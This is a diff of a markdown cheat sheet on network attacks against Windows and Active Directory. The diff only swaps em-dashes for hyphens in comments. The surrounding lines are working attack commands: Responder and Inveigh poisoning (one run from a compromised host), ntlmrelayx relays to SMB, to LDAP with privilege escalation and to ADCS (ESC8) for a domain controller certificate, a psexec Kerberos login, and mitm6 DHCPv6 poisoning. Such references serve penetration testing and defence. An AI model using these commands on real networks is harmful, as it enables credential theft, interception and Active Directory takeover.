@@ -7,10 +7,10 @@ Network-level attacks for Windows environments and Active Directory.
 ## 1. LLMNR / NBT-NS / mDNS Poisoning
 
 ```bash
-# Responder (attacker — Linux)
+# Responder (attacker - Linux)
 sudo responder -I eth0 -dwPv
 
-# Inveigh (attacker — PowerShell, run from compromised Windows host)
+# Inveigh (attacker - PowerShell, run from compromised Windows host)
 Import-Module .\Inveigh.ps1
 Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTP Y -SMB Y
 
@@ -33,7 +33,7 @@ ntlmrelayx.py -tf targets.txt -smb2support
 # Relay to LDAP (for AD escalation)
 ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user attacker
 
-# Relay to ADCS (ESC8 — web enrollment)
+# Relay to ADCS (ESC8 - web enrollment)
 ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
 
 # Trigger authentication (force target to auth to you)
@@ -146,7 +146,7 @@ psexec.py -k -no-pass domain/user@target
 ## 8. IPv6 Attacks (mitm6)
 
 ```bash
-# mitm6 — DHCP6 poisoning + WPAD + NTLM relay
+# mitm6 - DHCP6 poisoning + WPAD + NTLM relay
 sudo mitm6 -d domain.local
 
 # Combined with ntlmrelayx for delegation
